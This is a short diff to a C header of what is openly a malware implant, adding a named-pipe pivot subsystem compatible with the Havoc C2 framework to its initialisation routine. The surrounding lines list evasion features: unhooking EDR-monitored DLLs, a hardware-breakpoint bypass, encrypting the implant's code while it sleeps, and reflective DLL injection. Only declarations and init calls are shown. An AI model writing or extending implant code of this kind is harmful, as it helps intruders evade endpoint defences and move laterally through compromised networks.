@@ -77,6 +77,10 @@ VOID RefreshPE(void);
  * Result: no readable implant .text while sleeping.                        */
 void fluctuate(void);
 
+/* ── pivot/smb_pivot.c ───────────────────────────────────────────────────── */
+/* Named-pipe P2P pivot — Havoc wire-compatible frame format.                */
+void PivotInit(void);
+
 /* ── injection/LoadLibraryR.c (Stephen Fewer, Harmony Security, BSD-3) ──── */
 /* Canonical reflective DLL injection loader. Payload DLL must export
  * "ReflectiveLoader" (compiled with ReflectiveLoader.c).                   */
@@ -95,6 +99,7 @@ static inline BOOL ImplantInit(void)
     HwBpBypassInit();  /* non-fatal */
     FoliageInit();     /* non-fatal — FoliageSleep falls back to plain Sleep */
     RefreshPE();       /* unhook all EDR-hooked DLLs from clean disk copies */
+    PivotInit();       /* initialise named-pipe pivot subsystem */
 #ifdef SLEEP_FLUCTUATE
     fluctuate();       /* install Sleep() hook XOR encryptor (PEzor variant) */
 #endif
